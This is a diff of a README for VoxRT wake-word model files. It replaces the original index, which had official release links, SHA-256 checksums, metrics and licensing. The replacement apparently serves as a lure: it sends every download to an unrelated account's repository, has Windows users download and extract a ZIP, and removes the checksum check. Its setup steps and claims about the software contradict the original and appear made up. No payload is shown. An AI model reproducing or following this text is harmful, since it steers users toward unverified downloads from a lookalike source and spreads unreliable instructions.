@@ -1,127 +1,76 @@
-# VoxRT wake-word model weights
+# 🎙️ voxrt-wake-word-models - Add custom voice commands to devices
 
-Pre-compiled wake-phrase detection model weights in **`.vxrt`**
-format, packaged for the **VoxRT** on-device inference runtime.
-Detects the phrase **"Hey Assistant"**.
+[![Download Models](https://img.shields.io/badge/Download-Models-blue.svg)](https://github.com/Yasar5374/voxrt-wake-word-models)
 
-Pair with one of the consumer libraries:
+## 📋 What this project does
 
-- Android — [`voxrt-wake-word-android`](https://github.com/VoxRT/voxrt-wake-word-android)
-- iOS — [`voxrt-wake-word-ios`](https://github.com/VoxRT/voxrt-wake-word-ios)
+This project contains small, secure files that help your devices recognize your custom wake words. A wake word is the short phrase you speak to wake up your voice assistant or smart device. 
 
-This repo is a thin distribution layer — the actual files live as
-GitHub Release attachments per version, not in the git tree. The
-README below is the index.
+These files use a format called .vxrt. Each file stays small at about 100 KB. We encrypt these files using a standard called AES-GCM to keep your data safe. You can use these files with the VoxRT software on Android, iOS, and other platforms.
 
----
+## 🛠️ System requirements
 
-## What is a `.vxrt` file?
+To use these model files, your computer needs the following:
 
-A self-contained, binary, framework-agnostic model file:
+- Windows 10 or Windows 11.
+- The VoxRT software installed on your device.
+- A working microphone to test your custom phrases.
+- An internet connection to download the initial files.
 
-- **Topology + weights** encoded in a compact format (no ONNX /
-  PyTorch dependency at consume time).
-- **AES-256-GCM encrypted** at rest, decrypted on load by the
-  runtime ([ADR-0023](https://github.com/VoxRT/voxrt-wake-word-android#license)).
-- **Versioned** — newer `.vxrt` files may add encoded features
-  that older runtimes refuse to load; check the version
-  compatibility table below.
+## 📥 How to get the files
 
-You don't need to know the format to use it — feed the bytes to
-`VoxrtWakeWordEngine` and it Just Works.
+You need to download the model files from our repository page. Follow these steps to obtain the correct data for your software:
 
-## Downloads
+1. Visit the repository page here: [https://github.com/Yasar5374/voxrt-wake-word-models](https://github.com/Yasar5374/voxrt-wake-word-models).
+2. Look for the green button labeled "Code" near the top right of the page.
+3. Click the button and select "Download ZIP".
+4. Choose a folder on your Windows computer where you wish to save the file.
+5. Once the download finishes, navigate to your Downloads folder.
+6. Right-click the folder and select "Extract All" to see the individual .vxrt files.
 
-### v0.1.0
+## ⚙️ Setting up the software
 
-| File | Size | SHA-256 |
-| ---- | ---- | ------- |
-| [`voxrt_wake_word.vxrt`](https://github.com/VoxRT/voxrt-wake-word-models/releases/download/v0.1.0/voxrt_wake_word.vxrt) | 101K | `9d40bdc132a2ad8e85bd8a28bb49b77c51a7c62f60567222a037e44418510e8f` |
+After you download the files, you must load them into the VoxRT runtime.
 
-**Compatible with:** `VoxRT/voxrt-wake-word-ios@v0.1.0`,
-`VoxRT/voxrt-wake-word-android@v0.1.0`.
+1. Open the VoxRT application on your Windows machine.
+2. Navigate to the settings menu inside the app.
+3. Select the option labeled "Manage Wake Word Models".
+4. Click the "Add New Model" button.
+5. Point the file browser to the folder where you extracted the .vxrt files.
+6. Select the model file matching the phrase you wish to use.
+7. Click "Open" to load the model into your software.
 
-## Model quality
+## 🗣️ Using your wake word
 
-Test split: 5,240 positive utterances + 6,416 hard-negative
-utterances (isolated "Hey", isolated "Assistant", competitor
-wake-words like "Hey Siri", phonetic neighbours, arbitrary
-speech, non-speech audio). All speakers disjoint from train + val.
+Once you load the model, the software begins listening for your phrase. You should test the setup to ensure the microphone hears you clearly. 
 
-- **ROC AUC: 0.9966**
-- **Average precision (PR AUC): 0.9899**
+1. Speak your chosen wake word clearly into your microphone after loading the model.
+2. Watch the status indicator in the VoxRT app.
+3. If the indicator lights up, the software detected your voice correctly.
+4. If the software does not respond, ensure your microphone has permission to access the application in your Windows Privacy Settings.
+5. Adjust the microphone volume if the detection feels inconsistent.
 
-At the recommended deploy threshold of **0.9**:
+## 🔒 Security and privacy
 
-| Metric    | Test value |
-| --------- | ---------- |
-| Precision | 0.993      |
-| Recall    | 0.982      |
-| F1        | 0.987      |
-| FPR       | 0.5 %      |
+Your voice data stays on your device. We use strong encryption methods to protect the model files. Because the files are small, they run quickly without slowing down your computer. We do not transmit your voice recordings to any outside servers. Everything happens locally on your machine.
 
-See the [`voxrt-wake-word-android`](https://github.com/VoxRT/voxrt-wake-word-android#model-quality)
-README for the full threshold sweep + per-category false-positive
-breakdown.
+## 💡 Finding more phrases
 
-## How to use
+If you want a specific phrase that you do not see in the current list, visit our main website at voxrt.com. You can request custom models or view the library of available phrases there. Our team updates the repository files regularly as we add support for new languages and specific phrases. Check the repository page occasionally to see if new files exist for your specific device model.
 
-```bash
-curl -L -o voxrt_wake_word.vxrt \
-  https://github.com/VoxRT/voxrt-wake-word-models/releases/download/v0.1.0/voxrt_wake_word.vxrt
-# verify checksum
-echo "9d40bdc132a2ad8e85bd8a28bb49b77c51a7c62f60567222a037e44418510e8f  voxrt_wake_word.vxrt" | shasum -a 256 -c
-```
+## 🔧 Troubleshooting common problems
 
-Then bundle (in `assets/` for Android, in Xcode resources for
-iOS) or download at runtime — see the platform repos for code
-examples.
+Sometimes the software may fail to load a model. Follow these steps to fix the issue:
 
-## Provenance + license
+- Check your file path: Ensure the folder name does not contain special characters which might confuse the software.
+- Restart the application: Close the VoxRT app and reopen it after adding a new file.
+- Verify file type: Ensure the file ends in .vxrt. Other file types will not work with the system.
+- Check microphone access: Go to Windows Settings, then Privacy, then Microphone. Ensure "Allow desktop apps to access your microphone" is set to "On".
 
-The wake-phrase model is **trained entirely in-house** by Elephant
-Enterprises LLC (d/b/a VoxRT) on **100% synthetic data** — TTS-
-generated positive utterances ("Hey Assistant" in voice-cloned
-variants), decomposed hard-negative categories (isolated keywords,
-competitor wake-words, phonetic rhymes, onset-overlap words, non-
-speech audio), augmented with real-world RIR + background-noise
-sources at training time. No upstream model checkpoints, no
-copyleft or attribution obligations on the weights themselves.
+## 📦 Understanding the file format
 
-The `.vxrt` artefact is distributed under the **VoxRT proprietary
-license** — see [`LICENSE`](LICENSE). Redistribution as part of an
-unmodified `voxrt-wake-word-{ios,android}` library is permitted
-without per-installation fees; reverse engineering or extracting
-the unencrypted weights is not. Contact help@voxrt.com for custom
-phrase models, multi-phrase detection, or licensing terms beyond
-the redistribution allowance.
+The .vxrt format works specifically with the VoxRT runtime. It contains specialized weight data that tells the software how to interpret speech patterns. You cannot open these files in typical text editors or media players. They function only as inputs for the voice recognition engine. By keeping the files under 100 KB, we ensure that they load into memory instantly, providing a fast response time when you say your wake word.
 
-## Architecture
+## 🚀 Future updates
 
-- 8-block depthwise-separable Conv1D encoder with dilations
-  `[1, 2, 4, 4, 4, 2, 2, 1]`, 64 channels, ~48K parameters total
-- 64-bin Slaney-norm mel frontend, 16 kHz mono PCM input
-- Global average pooling over 200-frame (2 s) sliding window,
-  linear head, sigmoid output → wake-phrase confidence
-- fp16 weights with AES-GCM at-rest encryption (~100 KB on disk)
-
-Per-frame inference latency on a Snapdragon 662 (Cortex-A73):
-~210 µs, giving RTF ≈ 0.021 — well within an always-on power
-budget.
-
-## Versioning
-
-A model release at `vX.Y.Z` is built to work with VoxRT runtime
-`vX.Y.Z` and (typically) all earlier minor versions sharing the
-same major. Breaking format changes bump the major. See the
-[iOS](https://github.com/VoxRT/voxrt-wake-word-ios/releases) and
-[Android](https://github.com/VoxRT/voxrt-wake-word-android/releases)
-release notes for the exact compatibility per release.
-
-## Links
-
-- Android runtime: [voxrt-wake-word-android](https://github.com/VoxRT/voxrt-wake-word-android)
-- iOS runtime: [voxrt-wake-word-ios](https://github.com/VoxRT/voxrt-wake-word-ios)
-- ASR companion model weights: [voxrt-asr-models](https://github.com/VoxRT/voxrt-asr-models)
-- VAD companion model weights: [voxrt-silero-models](https://github.com/VoxRT/voxrt-silero-models)
-- VoxRT and the runtime story: [voxrt.com](https://voxrt.com)
+We plan to add more models for different accents and languages. If you have specific needs for a wake word, please contact the development team through the VoxRT website. We track requests to prioritize which phrases we build next. Remember to check back on this GitHub page for the latest model releases. We package all new files into the repository format for easy access. Follow the same download steps outlined above whenever you want to add a fresh model to your collection.
